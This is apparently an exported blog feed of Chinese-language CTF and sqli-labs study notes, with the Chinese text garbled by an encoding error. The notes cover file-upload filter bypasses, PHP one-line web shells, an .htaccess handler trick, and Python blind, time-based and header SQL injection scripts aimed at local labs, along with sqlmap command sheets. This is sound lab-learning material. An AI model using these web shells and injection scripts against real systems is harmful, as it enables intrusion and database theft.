3ã€ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡ï¼šä¿®æ”¹æ•°æ®åŒ…é‡Œçš„æ–‡ä»¶åæ”¹ä¸º test.php. æˆ–è€… test.asp_ (ä¸‹åˆ’çº¿æ˜¯ç©ºæ ¼)ç”±äºè¿™ç§å‘½åæ ¼å¼åœ¨windowsç³»ç»Ÿé‡Œæ˜¯ä¸å…è®¸çš„ã€‚æ‰€ä»¥åœ¨ç»•è¿‡ä¸Šä¼ ä¹‹åwindowsç³»ç»Ÿä¼šè‡ªåŠ¨å»æ‰ ç‚¹å’Œç©ºæ ¼ã€‚Unix/Linuxç³»ç»Ÿæ²¡æœ‰è¿™ä¸ªç‰¹æ€§ã€‚<br>
4ã€0x00æˆªæ–­ç»•è¿‡<br>
5ã€.htaccessæ–‡ä»¶æ”»å‡»ï¼ˆç»“åˆé»‘åå•æ”»å‡»ï¼‰</p>
<h4 id="apacheè§£ææ¼æ´">Apacheè§£ææ¼æ´</h4>
<p><code>æ¼æ´åŸç†</code>ï¼šä¸€ä¸ªæ–‡ä»¶åä¸ºtest.php.aaa.bbb.cccçš„æ–‡ä»¶ï¼ŒApacheä¼šä»cccçš„ä½ç½®å¾€phpçš„ä½ç½®å¼€å§‹å°è¯•è§£æ ï¼Œå¦‚æœcccä¸å±äºApacheèƒ½è§£æçš„åç¼€åï¼Œé‚£ä¹ˆApacheå°±ä¼šå°è¯•å»è§£æbbbï¼Œè¿™æ ·ä¸€ç›´å¾€å‰å°è¯•ï¼Œç›´åˆ°é‡åˆ°ä¸€ä¸ªèƒ½è§£æçš„æ‹“å±•åä¸ºæ­¢</p>
<p><code>ç»•è¿‡æ–¹æ³•</code>:æ·»åŠ æ— ç”¨æ‰©å±•åå¦‚xxx.php --&gt;xxx.php.aaa</p>
<h4 id="iisè§£ææ¼æ´">IISè§£ææ¼æ´</h4>
<p><code>IIS6.0è§£ææ¼æ´</code>ï¼š</p>
<p>1.ç›®å½•è§£æï¼šä»¥.asp ã€.asaã€.cerã€.cdxå‘½åçš„æ–‡ä»¶å¤¹é‡Œçš„æ–‡ä»¶éƒ½å°†ä¼šè¢«å½“æˆASPæ–‡ä»¶æ‰§è¡Œã€‚</p>
<p>2.æ–‡ä»¶è§£æï¼šåªè¦æ–‡ä»¶åä¸­å«æœ‰.asp;ã€.asa;ã€.cer;ã€.cdx;ä¼šä¼˜å…ˆæŒ‰ aspæ¥è§£æï¼Œ.asp;.jpg è¿™ç§ç•¸å½¢æ–‡ä»¶ååœ¨â€œï¼›â€åé¢çš„ç›´æ¥è¢«å¿½ç•¥ï¼Œä¹Ÿå°±æ˜¯è¯´å½“æˆ *.aspæ–‡ä»¶æ‰§è¡Œã€‚</p>
<p><code>IIS7.0/7.5è§£ææ¼æ´</code>:</p>
<p>å¯¹ä»»æ„æ–‡ä»¶ååªè¦åœ¨URLåé¢è¿½åŠ ä¸Šå­—ç¬¦ä¸²&quot;/ä»»æ„æ–‡ä»¶å.php&quot;,å°±ä¼šæŒ‰ç…§ php çš„æ–¹å¼å»è§£æ<br>
å¦‚â€http://url/upload/1.jpg/1adf.phpâ€</p>
<h2 id="ç»ƒä¹ é¢˜ç›®">ç»ƒä¹ é¢˜ç›®</h2>
<h3 id="æå®¢å¤§æŒ‘æˆ˜-2019upload1">[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload1</h3>
<p><code>MIMEç»•è¿‡</code>å’Œ<code>é»‘åå•ç»•è¿‡</code>ï¼Œåªå…è®¸ä¸Šä¼ å›¾ç‰‡ï¼Œå¯¹phpæœ‰ç®€å•è¿‡æ»¤ã€‚</p>
<p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬</p>
<pre><code class="language-php">&lt;?php @eval($_POST['pass']);?&gt;
</code></pre>
<p>æŠ“åŒ…ä¿®æ”¹</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019164716089.png" alt="image-20211019164716089" style="zoom:150%;" />
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019164731251.png" alt="image-20211019164731251" style="zoom: 33%;" />
<p>å¯¹å†…å®¹æœ‰è¿‡æ»¤ï¼Œæ¢ä¸€ä¸ªæœ¨é©¬</p>
<pre><code class="language-php">GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[pass])&lt;/script&gt;
</code></pre>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019165114142.png" alt="image-20211019165114142" style="zoom:150%;" />
<p>æˆåŠŸ</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019165418509.png" alt="image-20211019165418509" style="zoom: 33%;" />
<p>è®¿é—®è¯¥æ–‡ä»¶upload/2.phtml</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019165551551.png" alt="image-20211019165551551" style="zoom:50%;" />
<p>è¯´æ˜å­˜åœ¨è¯¥æ–‡ä»¶ï¼Œèšå‰‘è¿æ¥</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019170411685.png" alt="image-20211019170411685" style="zoom:67%;" />
<p>æ‰¾åˆ°flag</p>
<h3 id="actf2020-æ–°ç”Ÿèµ›upload1">[ACTF2020 æ–°ç”Ÿèµ›]Upload1</h3>
<p><code>å‰ç«¯è¿‡æ»¤</code></p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019170918935.png" alt="image-20211019170918935" style="zoom: 67%;" />
<p>æŠŠæ–‡ä»¶æ”¹æˆgifï¼ŒæŠ“åŒ…å†æ”¹æˆphp</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019171957129.png" alt="image-20211019171957129" style="zoom: 80%;" />
<p>ä¿®æ”¹<br>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019172023103.png" alt="image-20211019172023103" style="zoom:150%;" /></p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019172352138.png" alt="image-20211019172352138" style="zoom:67%;" />
<p>emmmphpä¹Ÿè¦ç»•ä¸€ä¸‹æ”¹æˆphtml</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019172444434.png" alt="image-20211019172444434" style="zoom:150%;" />
<p>æœ‰äº†ï¼Œè®¿é—®è¯¥é¡µé¢</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019172549473.png" alt="image-20211019172549473" style="zoom:80%;" />
<p>èšå‰‘ä¸€ä¸‹ï¼Œç”¨å‘½ä»¤è¡Œæ‰¾åˆ°flag</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019173439257.png" alt="image-20211019173439257" style="zoom:67%;" />
<h3 id="mrctf2020ä½ ä¼ ä½ å‘¢1">[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢1</h3>
<p><code>htaccessç»•è¿‡</code></p>
<pre><code class="language-php">//æŠŠhack.pngè§£ææˆphp
&lt;FilesMatch &quot;hack.png&quot;&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre>
<p>ä¸Šä¼ htaccessæ–‡ä»¶ï¼ŒæŠ“åŒ…ä¿®æ”¹ç±»å‹ä¸ºpng</p>
<p><img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019180047323.png"
alt="image-20211019180047323" style="zoom: 100%;" /></p>
<p>å†ä¸Šä¼ ä¸€ä¸ªå«æœ‰æœ¨é©¬çš„å‡pngï¼Œä¸Šä¼ æˆåŠŸ</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019175206673.png" alt="image-20211019175206673" style="zoom: 50%;" />
<p>èšå‰‘ä¸€ä¸‹ï¼Œæ‰¾åˆ°flag</p>
<h3 id="ç¬¬äºŒç« -webè¿›é˜¶æ–‡ä»¶ä¸Šä¼ 1">[ç¬¬äºŒç«  webè¿›é˜¶]æ–‡ä»¶ä¸Šä¼ 1</h3>
<p>é¢˜ç›®ç›´æ¥ç»™å‡ºäº†æºç ï¼Œå¾—åˆ°è¿‡æ»¤ä¿¡æ¯ï¼š</p>
<p>1.ä»…å…è®¸ä¸Šä¼ zipã€jpgã€gifã€pngæ–‡ä»¶<br>
2.å¦‚æœä¸Šä¼ å‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…å†…ä¸å…è®¸å«æœ‰phpæ–‡ä»¶</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019183807280.png" alt="image-20211019183807280" style="zoom:67%;" />
<p>ä¸Šä¼ ä¸€ä¸ªå«æœ‰phpçš„zip</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019183103048.png" alt="image-20211019183103048" style="zoom:50%;" />
<p>è¦ç»•è¿‡phpï¼Œæ”¹æˆphtmlï¼Œä¸Šä¼ æˆåŠŸï¼Œé—®é¢˜æ˜¯ä¸çŸ¥é“è·¯å¾„</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019183524005.png" alt="image-20211019183524005" style="zoom:67%;" />
<p>ä¸Šä¼ æˆåŠŸåä¼šåœ¨uploadä¸‹éšæœºç”Ÿæˆä¸€ä¸ªmd5ç›®å½•å­˜æ”¾æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´å¾ˆéš¾æ‹¿åˆ°æ–‡ä»¶çš„è·¯å¾„ï¼Œè®¾æ³•ç»•è¿‡è¿™ä¸ªç›®å½•ï¼Œè®©æ–‡ä»¶å­˜å‚¨åœ¨æ ¹ç›®å½•ä¸‹</p>
<p>010 editorä¿®æ”¹æ–‡ä»¶åï¼Œä½¿ä¹‹å­˜åœ¨æ ¹ç›®å½•ä¸‹ï¼ˆä¿®æ”¹çš„æ—¶å€™ç°åœ¨åŸæ¥çš„æ–‡ä»¶åé¢„ç•™è¶³å¤Ÿçš„ä½ç½®ï¼‰</p>
<p><img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019191350117.png"
alt="image-20211019191350117" style="zoom:100%;" /></p>
<p>emmmmï¼Œå¾¡å‰‘è¿ä¸Šäº†ä½†æ‰“ä¸å¼€ï¼Œæ–‡ä»¶åæ¢æˆphp.xx(<code>Apacheè§£ææ¼æ´</code>)</p>
<p>ä¸Šä¼ åè®¿é—®ï¼Œå¾—åˆ°flag</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211019192014051.png" alt="image-20211019192014051" style="zoom:67%;" />]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sqli-labs(11~20)è„šæœ¬ã€sqlmapå­¦ä¹ ]]></title>
        <id>https://z0ekball.github.io/post/sqli-labs11~20jiao-ben-sqlmap-xue-xi/</id>
        <link href="https://z0ekball.github.io/post/sqli-labs11~20jiao-ben-sqlmap-xue-xi/">
        </link>
        <updated>2021-06-18T14:56:25.000Z</updated>
        <content type="html"><![CDATA[<h1 id="sqlmapçŸ¥è¯†è¡¥å……">sqlmapçŸ¥è¯†è¡¥å……</h1>
<pre><code>-r è¡¨ç¤ºåŠ è½½ä¸€ä¸ªæ–‡ä»¶
-p æŒ‡å®šå‚æ•°
</code></pre>
<h1 id="less-11æ™®æ™®é€šé€šçš„post">less-11(æ™®æ™®é€šé€šçš„post)</h1>
<h3 id="ä¸Šä¼ postæ–‡ä»¶å¾—åˆ°å‚æ•°">ä¸Šä¼ postæ–‡ä»¶ï¼Œå¾—åˆ°å‚æ•°</h3>
<pre><code>sqlmap.py -r &quot;C:\Users\ä¸·æœ¨ä¸·\Desktop\less-11.txt&quot;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1624290761761.png" alt="" loading="lazy"></figure>
<h3 id="æ ¹æ®å‚æ•°å¾—åˆ°å½“å‰æ•°æ®åº“">æ ¹æ®å‚æ•°ï¼Œå¾—åˆ°å½“å‰æ•°æ®åº“</h3>
<pre><code>sqlmap.py -r &quot;C:\Users\ä¸·æœ¨ä¸·\Desktop\less-11.txt&quot; -p uname --dbs
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/1624290826466.png" alt="" loading="lazy"></figure>
<h3 id="è·å–ç”¨æˆ·åå’Œå¯†ç ">è·å–ç”¨æˆ·åå’Œå¯†ç </h3>
<pre><code>sqlmap.py -r &quot;C:\Users\ä¸·æœ¨ä¸·\Desktop\less-11.txt&quot; -p uname -T &quot;users&quot;  -C &quot;username&quot;,&quot;password&quot; --dump
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/1624291100650.png" alt="" loading="lazy"></figure>
<h3 id="è„šæœ¬æŸ¥è¯¢å½“å‰æ•°æ®åº“åç§°é‡‡ç”¨ç›²æ³¨å½¢å¼">è„šæœ¬ï¼šæŸ¥è¯¢å½“å‰æ•°æ®åº“åç§°(é‡‡ç”¨ç›²æ³¨å½¢å¼)</h3>
<pre><code class="language-python">import requests #æ¯”urllib.parseæ–¹ä¾¿
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-11/&quot;
d = list('abcdefghijklmnopqrstuvwxyz0123456789@_.{}?!')
#æ³¨å…¥å­—æ®µ
inn=&quot;1' or 1=1 and mid((database()),%s,1)='%s'#&quot;
for i in range(1,30):
    for j in d:
        #å­—å…¸æ ¼å¼
        data={'uname':inn %(i,j),'passwd':'','submit':'Submit'}
        #å‘é€postè¯·æ±‚
        response = requests.post(url,data = data)
        #è·å–æŠ¥æ–‡
        t=response.text
        if t.find('Login') &gt;0:
            name+=j
            print(j)
print(name)
</code></pre>
<h3 id="ç»“æœ">ç»“æœ</h3>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/1624294940779.png" alt="" loading="lazy"></figure>
<h1 id="less-12">less-12</h1>
<p>uname=n&quot;) or 1=1 #,å…¶ä»–å’Œ11ä¸€æ ·</p>
<h1 id="less-13æ—¶é—´ç›²æ³¨">less-13(æ—¶é—´ç›²æ³¨)</h1>
<h3 id="è·å–idå’Œç”¨æˆ·å">è·å–idå’Œç”¨æˆ·å</h3>
<pre><code>sqlmap.py -r &quot;C:\Users\ä¸·æœ¨ä¸·\Desktop\less-13.txt&quot; -D &quot;security&quot; -T &quot;users&quot; -C &quot;id&quot;,&quot;username&quot; --dump
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/1624298061718.png" alt="" loading="lazy"></figure>
<h3 id="è„šæœ¬è·å–id3çš„ç”¨æˆ·åå‚è€ƒæ—¶é—´ç›²æ³¨">è„šæœ¬ï¼šè·å–id=3çš„ç”¨æˆ·åï¼Œå‚è€ƒæ—¶é—´ç›²æ³¨</h3>
<pre><code class="language-python">import requests
import time
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-13/&quot;
d = list('abcdefghijklmnopqrstuvwxyz')
#æ³¨å…¥å­—æ®µ
inn=&quot;n') or if(mid((select username from security.users where id=3),%s,1)='%s',sleep(1),0)#&quot;
for i in range(1,10):
    for j in d:
        #å­—å…¸æ ¼å¼
        time1=time.time()
        data={'uname':inn %(i,j),'passwd':'','submit':'Submit'}
        #print(data)
        #å‘é€postè¯·æ±‚
        response = requests.post(url,data = data)
        #t=response.text
        #è·å–æŠ¥æ–‡
        time2=time.time()
        if time2-time1 &gt;1:
            name+=j
            print(j)
            
print(name)
</code></pre>
<h3 id="ç»“æœ-2">ç»“æœ</h3>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/1624298188766.png" alt="" loading="lazy"></figure>
<h1 id="less-14">less-14</h1>
<p>å’Œ13ä¸€æ ·çš„æ—¶é—´ç›²æ³¨ï¼Œä½†æ³¨æ„è½¬ä¹‰æˆ \&quot;</p>
<h3 id="è„šæœ¬è·å–åº“">è„šæœ¬ï¼šè·å–åº“</h3>
<pre><code class="language-python">import requests
import time
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-14/&quot;
d = list('abcdefghijklmnopqrstuvwxyz')
#æ³¨å…¥å­—æ®µ
#è¿™é‡Œçš„å¼•å·æœ‰å†²çªï¼Œæ”¹ä¸º\&quot;
inn=&quot;n\&quot; or if(mid((database()),%s,1)='%s',sleep(1),0)#&quot;
for i in range(1,10):
    for j in d:
        #å­—å…¸æ ¼å¼
        time1=time.time()
        data={'uname':inn %(i,j),'passwd':'','submit':'Submit'}
        #print(data)
        #å‘é€postè¯·æ±‚
        response = requests.post(url,data = data)
        #t=response.text
        #è·å–æŠ¥æ–‡
        time2=time.time()
        if time2-time1 &gt;1:
            name+=j
            print(j)
            
print(name)
</code></pre>
<h3 id="ç»“æœ-3">ç»“æœ</h3>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/1624299560173.png" alt="" loading="lazy"></figure>
<h1 id="less-15å¯†ç æ³¨å…¥ç‚¹">less-15(å¯†ç æ³¨å…¥ç‚¹)</h1>
<p>å’Œå‰é¢ä¸€æ ·ï¼Œæ³¨å…¥ç‚¹æ”¹ä¸ºå¯†ç </p>
<h3 id="è„šæœ¬è·å–åº“-2">è„šæœ¬ï¼šè·å–åº“</h3>
<pre><code class="language-python">import requests
import time
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-15/&quot;
d = list('abcdefghijklmnopqrstuvwxyz')
#æ³¨å…¥å­—æ®µ
inn=&quot;n' or if(mid((database()),%s,1)='%s',sleep(1),0)#&quot;
for i in range(1,10):
    for j in d:
        #å­—å…¸æ ¼å¼
        time1=time.time()
        #æ³¨å…¥ç‚¹åœ¨å¯†ç 
        data={'uname':'','passwd':inn %(i,j),'submit':'Submit'}
        #print(data)
        #å‘é€postè¯·æ±‚
        response = requests.post(url,data = data)
        #t=response.text
        #è·å–æŠ¥æ–‡
        time2=time.time()
        if time2-time1 &gt;1:
            name+=j
            print(j)
            
print(name)
</code></pre>
<h3 id="ç»“æœ-4">ç»“æœ</h3>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/1624300007923.png" alt="" loading="lazy"></figure>
<h1 id="less-16">less-16</h1>
<p>uname=addmin&amp;passwd=ad&quot; or 1=1 #ï¼Œæ³¨æ„\&quot;ï¼Œå…¶ä»–å’Œ15ä¸€æ ·</p>
<h1 id="less-17updatexmlæŠ¥é”™æ³¨å…¥">less-17(updatexmlæŠ¥é”™æ³¨å…¥)</h1>
<p>æ³¨æ„\'è½¬ä¹‰</p>
<h3 id="è„šæœ¬æŸ¥è¯¢æ•°æ®åº“">è„šæœ¬ï¼šæŸ¥è¯¢æ•°æ®åº“</h3>
<pre><code class="language-python">import requests
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-17/&quot;
d = list('abcdefghijklmnopqrstuvwxyz')
data={'uname':'admin','passwd':'dadad\' and updatexml(1,concat(0x7e,(database())),1)#','submit':'Submit'}
r = requests.post(url,data = data)
t=r.text
print(t)
</code></pre>
<h3 id="ç»“æœåœ¨æŠ¥é”™ä¿¡æ¯ä¸­å¯è§åº“">ç»“æœï¼šåœ¨æŠ¥é”™ä¿¡æ¯ä¸­å¯è§åº“</h3>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/1624304453223.png" alt="" loading="lazy"></figure>
<h1 id="less-18user-agentæ³¨å…¥">less-18(user-agentæ³¨å…¥)</h1>
<h3 id="è„šæœ¬postè¯·æ±‚ä¿®æ”¹è¯·æ±‚å¤´çš„user-agent-bibièµ–èµ–è½¬ä¹‰æ”¹çš„å¿ƒæ€å´©äº†">è„šæœ¬ï¼špostè¯·æ±‚ä¿®æ”¹è¯·æ±‚å¤´çš„user-agent    (bibièµ–èµ–ï¼šè½¬ä¹‰æ”¹çš„å¿ƒæ€å´©äº†= =)</h3>
<pre><code class="language-python">import requests
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-18/&quot;
#\è½¬ä¹‰  \è½¬ä¹‰  \è½¬ä¹‰  \è½¬ä¹‰  \è½¬ä¹‰  \è½¬ä¹‰ \è½¬ä¹‰ 
'''
{'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0)Gecko/20100101 Firefox/89.0
 \'or updatexml(1,concat(0x7e,(database())),1)or \'1\'=\'1'}
'''
u={'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\'or updatexml(1,concat(0x7e,(database())),1)or \'1\'=\'1'}
data={'uname':'admin','passwd':'admin','submit':'Submit'}
r = requests.post(url,data,headers=u)
t=r.text
print(t)
</code></pre>
<h3 id="ç»“æœ-5">ç»“æœ</h3>
<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/1624307139151.png" alt="" loading="lazy"></figure>
<h1 id="less-19refereræ³¨å…¥">less-19(refereræ³¨å…¥)</h1>
<h3 id="è„šæœ¬è·Ÿ18ä¸€æ ·æ”¹æˆrefererå°±è¡ŒåŒæ ·éœ€è¦è½¬ä¹‰">è„šæœ¬ï¼šè·Ÿ18ä¸€æ ·ï¼Œæ”¹æˆrefererå°±è¡Œï¼ŒåŒæ ·éœ€è¦è½¬ä¹‰</h3>
<pre><code class="language-python">import requests
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-19/&quot;
'''
Referer: http://127.0.0.1/sqli/Less-19/
{'Referer':'http://127.0.0.1/sqli/Less-19/
 \'or updatexml(1,concat(0x7e,(database())),1)or \'1\'=\'1'}
'''
u={'Referer':'http://127.0.0.1/sqli/Less-19/\'or updatexml(1,concat(0x7e,(database())),1)or \'1\'=\'1'}
data={'uname':'admin','passwd':'admin','submit':'Submit'}
r = requests.post(url,data,headers=u)
t=r.text
print(t)
</code></pre>
<h3 id="ç»“æœ-6">ç»“æœ</h3>
<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/1624307491060.png" alt="" loading="lazy"></figure>
<h1 id="less-20cookieæ³¨å…¥">less-20(cookieæ³¨å…¥)</h1>
<p>cookieä¸­valueå€¼' #æ³¨å…¥</p>
<h3 id="è„šæœ¬">è„šæœ¬</h3>
<pre><code class="language-python">import requests
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-20/&quot;
u={'Cookie':'uname=1\' union select 1,2,group_concat(concat_ws(\'-\',id,username,password)) from users#'}
data={'uname':'admin','passwd':'admin','submit':'Submit'}
r = requests.post(url,data,headers=u)
t=r.text
print(t)
</code></pre>
<h3 id="ç»“æœæ•´ä¸å‡ºæ¥åº”è¯¥æ˜¯ç‰ˆæœ¬é—®é¢˜æš‚æ—¶æœªè§£å†³">ç»“æœï¼šæ•´ä¸å‡ºæ¥ï¼Œåº”è¯¥æ˜¯ç‰ˆæœ¬é—®é¢˜ï¼Œæš‚æ—¶æœªè§£å†³</h3>
<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/1624308452186.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sqli-labs(1~10)è„šæœ¬ã€sqlmapå­¦ä¹ ]]></title>
        <id>https://z0ekball.github.io/post/sqli-jiao-ben/</id>
        <link href="https://z0ekball.github.io/post/sqli-jiao-ben/">
        </link>
        <updated>2021-06-15T07:11:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="ä¸€äº›å‡†å¤‡">ä¸€äº›å‡†å¤‡</h2>
<ol>
<li>å®‰è£…sqlmap</li>
<li>å‘½ä»¤è¡Œpip install requests æ£€æŸ¥æ—¶å€™å®‰è£…requestæˆ–è€…éœ€è¦æ›´æ–°ï¼Œå¦åˆ™æ— æ³•ä½¿ç”¨ï¼›</li>
<li>åŠ å¼•å·å¿«æ·é”®ç”¨ä¸ï¼Œç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œæ›¿æ¢</li>
</ol>
<pre><code>(.*?):(.*)
'$1':'$2'ï¼Œ
</code></pre>
<h1 id="sqlmapåŸºç¡€çŸ¥è¯†">sqlmapåŸºç¡€çŸ¥è¯†</h1>
<ol>
<li>sqlmapå¸¸è§æ­¥éª¤ï¼š</li>
</ol>
<pre><code>sqlmap -u url --dbs #è·å–æ•°æ®åº“
sqlmap -u url --current-user #è·å–å½“å‰ç”¨æˆ·åç§° ï¼š
sqlmap -u url --current-db #è·å–å½“å‰æ•°æ®åº“åç§°
sqlmap -u url -D æ•°æ®åº“å --tables   #åˆ—å‡ºè¡¨å ï¼š 
sqlmap -u url -D æ•°æ®åº“å -T è¡¨å --columns #åˆ—å‡ºå­—æ®µ 
sqlmap -u url -D æ•°æ®åº“å -T è¡¨å -C å­—æ®µå1,å­—æ®µå2,â€¦â€¦ --dump #è·å–å­—æ®µå†…å®¹
</code></pre>
<ol start="2">
<li>å¸¸è§å‚æ•°</li>
</ol>
<pre><code>--cookie=cookieçš„å†…å®¹        è®¾ç½®cookie å€¼ é€šå¸¸é…åˆè·å–æ•°æ®åº“ä½¿ç”¨ 
--data        è®¾ç½® POST æäº¤çš„å€¼
-u        æŒ‡å®šç›®æ ‡ URL
-b        è·å– DBMS banner
--current-db        è·å–å½“å‰æ•°æ®åº“
--current-user        è·å–å½“å‰æ•°æ®åº“çš„ç”¨æˆ·
--tables        è·å–æ•°æ®åº“é‡Œæ‰€æœ‰çš„è¡¨å
--columns        è·å–è¡¨é‡Œçš„æ‰€æœ‰å­—æ®µ
--dump        è·å–å­—æ®µä¸­çš„å†…å®¹
--current-user        è·å–å½“å‰ç”¨æˆ·
-D [æ•°æ®åº“å]       æŒ‡å®šæ•°æ®åº“å
-T  [è¡¨å]      æŒ‡å®šè¡¨å
-C  [å­—æ®µå]      æŒ‡å®šå­—æ®µå
--string       å½“æŸ¥è¯¢å¯ç”¨æ—¶ç”¨æ¥åŒ¹é…é¡µé¢ä¸­çš„å­—ç¬¦ä¸²
--users        æšä¸¾æ‰€æœ‰ç”¨æˆ·
--passwords      æšä¸¾æ‰€æœ‰ç”¨æˆ·çš„å¯†ç hsah
--dbs      æšä¸¾æ•°æ®åº“ä¸­çš„æ•°æ®åº“å
-r       æŒ‡å®šè¯·æ±‚åŒ…

GETå‹æ³¨å…¥ä¸€èˆ¬ç”¨ sqlmap -u url
POSTå‹æ³¨å…¥ä¸€èˆ¬ç”¨ sqlmap -u url --data POSTå‚æ•°
</code></pre>
<ol start="3">
<li>å¸¸è§å‘½ä»¤</li>
</ol>
<pre><code>--sql-query=&quot; &quot;  æ‰§è¡ŒæŸ¥è¯¢è¯­å¥
--level 5  æ¢æµ‹ç­‰çº§(1~5 é»˜è®¤ä¸º1ï¼Œç­‰çº§è¶Šé«˜Payloadè¶Šå¤šï¼Œé€Ÿåº¦ä¹Ÿæ¯”è¾ƒæ…¢)
--is-dba   åˆ¤æ–­å½“å‰ç”¨æˆ·æ˜¯å¦æ˜¯ç®¡ç†å‘˜æƒé™
--roles    åˆ—å‡ºæ•°æ®åº“ç®¡ç†å‘˜è§’è‰²(ä»…é€‚ç”¨ä¸Oracleæ•°æ®åº“)
--referer  HTTP Refererå¤´(ä¼ªé€ HTTPå¤´ä¸­çš„Refererï¼Œå½“--levelç­‰çº§å¤§äºç­‰äº3æ—¶ä¼šé€šè¿‡ä¼ªé€ Refereræ¥è¿›è¡Œæ³¨å…¥)
--sql-shell è¿è¡Œè‡ªå®šä¹‰SQLè¯­å¥ ç”¨æ³•ï¼šsqlmap -u url --sql-shell
--os-cmdï¼Œ--os-shell è¿è¡Œä»»æ„æ“ä½œç³»ç»Ÿå‘½ä»¤(ä»…æ”¯æŒMySQLã€PostgreSQLã€SQL Server)
--file-read ä»æ•°æ®åº“æœåŠ¡å™¨ä¸­è¯»å–æ–‡ä»¶(è¦çŸ¥é“æ–‡ä»¶ç»å¯¹è·¯å¾„)
--file-write &quot;æœ¬åœ°æ–‡ä»¶è·¯å¾„&quot; --file-dest &quot;è¿œç¨‹ç»å¯¹è·¯å¾„&quot;   ä¸Šä¼ æ–‡ä»¶åˆ°æ•°æ®åº“æœåŠ¡å™¨ä¸­
</code></pre>
<h1 id="less-1æ™®æ™®é€šé€šçš„get">less-1(æ™®æ™®é€šé€šçš„get)</h1>
<h3 id="è„šæœ¬è·å–ç”¨æˆ·å’Œå¯†ç ">è„šæœ¬ï¼šè·å–ç”¨æˆ·å’Œå¯†ç </h3>
<pre><code class="language-python">import urllib.parse #è§£æurl
import http.client #å®ç°äº†æ‰€æœ‰ HTTP çš„æ–¹æ³•ï¼ˆGETã€POSTã€PUTã€HEADã€DELETEã€HEADã€OPTIONS ç­‰ï¼‰
                   #æ”¯æŒ HTTPS åè®®
                   #æ”¯æŒä»£ç†æœåŠ¡å™¨ï¼ˆNginxç­‰ï¼‰ç­‰
                   #æ”¯æŒè‡ªåŠ¨ï¼ˆè·³è½¬ï¼‰è½¬å‘

url = &quot;127.0.0.1&quot;
#bodyå¿…é¡»urlç¼–ç ,å¯ç”¨urllib.parse.quote()è½¬,æˆ–è€…æµè§ˆå™¨ä¸Šè½¬
body=&quot;/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(concat_ws(%27~%27,username,password))from%20security.users--+&quot;
c = http.client.HTTPConnection(url) #ç¡®å®šå¯¹è±¡
c.request(&quot;GET&quot;, body) #ç¡®å®šæ–¹å¼ 
